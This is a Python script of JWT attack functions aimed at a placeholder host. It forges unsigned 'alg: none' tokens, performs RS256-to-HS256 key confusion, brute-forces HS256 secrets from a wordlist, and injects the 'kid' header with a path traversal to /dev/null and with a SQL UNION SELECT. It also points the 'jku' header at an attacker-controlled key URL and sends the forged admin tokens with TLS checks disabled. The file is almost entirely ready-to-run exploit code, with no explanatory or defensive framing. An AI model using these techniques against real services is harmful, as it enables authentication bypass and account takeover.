#!/usr/bin/env python3

import base64
import json
import jwt  # PyJWT
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"


def decode_without_verify(token: str) -> dict:
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    print("Header :", json.dumps(header, indent=2))
    print("Payload:", json.dumps(payload, indent=2))
    return {"header": header, "payload": payload}


def manual_decode(token: str) -> dict:
    def b64url_decode(segment: str) -> bytes:
        padding = "=" * (-len(segment) % 4)
        return base64.urlsafe_b64decode(segment + padding)

    header_b64, payload_b64, _sig = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    return {"header": header, "payload": payload}


def forge_alg_none(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}

    def b64url(data: dict) -> str:
        raw = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    token = jwt.encode(payload, key=None, algorithm="none")
    return token

    # return f"{b64url(header)}.{b64url(payload)}."

def alg_confusion_rs256_to_hs256(public_key_pem: str, payload: dict) -> str:
    token = jwt.encode(payload, key=public_key_pem, algorithm="HS256")
    return token

def bruteforce_hs256_secret(token: str, wordlist_path: str) -> str | None:
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            candidate = line.strip()
            if not candidate:
                continue
            try:
                jwt.decode(token, candidate, algorithms=["HS256"])
                print(f"[+] Secret: {candidate}")
                return candidate
            except jwt.InvalidSignatureError:
                continue
            except jwt.DecodeError:
                continue
    print("[-] Secret not found in the dictionary")
    return None


def forge_token_with_known_secret(secret: str, payload: dict, algorithm: str = "HS256") -> str:
    return jwt.encode(payload, secret, algorithm=algorithm)


def forge_with_kid_path_traversal(payload: dict, known_file_content: bytes) -> str:
    headers = {"kid": "../../../../dev/null"}
    token = jwt.encode(payload, key=known_file_content, algorithm="HS256", headers=headers)
    return token


def forge_with_kid_sqli(payload: dict, injected_secret: str = "attacker_controlled_secret") -> str:
    headers = {"kid": f"nonexistent' UNION SELECT '{injected_secret}' -- -"}
    token = jwt.encode(payload, key=injected_secret, algorithm="HS256", headers=headers)
    return token


def forge_with_jku(payload: dict, attacker_jwks_url: str, private_key_pem: str) -> str:
    headers = {"jku": attacker_jwks_url}
    token = jwt.encode(payload, key=private_key_pem, algorithm="RS256", headers=headers)
    return token



def send_forged_token(token: str, endpoint: str = "/api/me"):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}{endpoint}", headers=headers, verify=False, timeout=10)
    print(r.status_code, r.text[:300])
    return r


if __name__ == "__main__":
    # example_token = "eyJhbGciOi..."
    # decode_without_verify(example_token)
    #
    # admin_payload = {"user": "admin", "role": "admin"}
    # forged = forge_alg_none(admin_payload)
    # send_forged_token(forged)
    pass